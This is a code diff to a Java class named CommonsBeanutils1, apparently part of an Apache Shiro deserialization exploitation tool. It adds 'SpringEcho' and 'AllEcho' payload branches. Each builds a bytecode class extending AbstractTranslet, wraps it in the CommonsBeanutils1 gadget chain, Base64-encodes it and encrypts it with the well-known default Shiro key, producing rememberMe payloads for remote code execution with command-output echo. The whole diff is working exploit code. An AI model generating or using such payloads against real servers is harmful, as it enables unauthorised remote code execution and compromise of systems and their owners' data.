@@ -76,7 +76,42 @@ public class CommonsBeanutils1 {
             String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
 //            System.out.println(result);
             return result;
+        } else if (echoPayload.equals("SpringEcho")){
+            // 获取回显类型
+            SpringEcho springEcho = new SpringEcho();
+            ctClass = springEcho.genPayload(pool);
+
+            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
+                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+            } else {
+                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
+            }
+            ctClass.setSuperclass(superClass);            // 设置父类
+
+            // 生成反序列化payload
+            byte[] payload = new CommonsBeanutils1().getPayload(ctClass.toBytecode());
+            String data = Base64.getEncoder().encodeToString(payload);
+            String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
+            return result;
+        } else if (echoPayload.equals("AllEcho")) {
+            // 获取回显类型
+            AllEcho allEcho = new AllEcho();
+            ctClass = allEcho.genPayload(pool);
+
+            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
+                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+            } else {
+                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
+            }
+            ctClass.setSuperclass(superClass);            // 设置父类
+
+            // 生成反序列化payload
+            byte[] payload = new CommonsBeanutils1().getPayload(ctClass.toBytecode());
+            String data = Base64.getEncoder().encodeToString(payload);
+            String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
+            return result;
         }
+
         return null;
     }
 
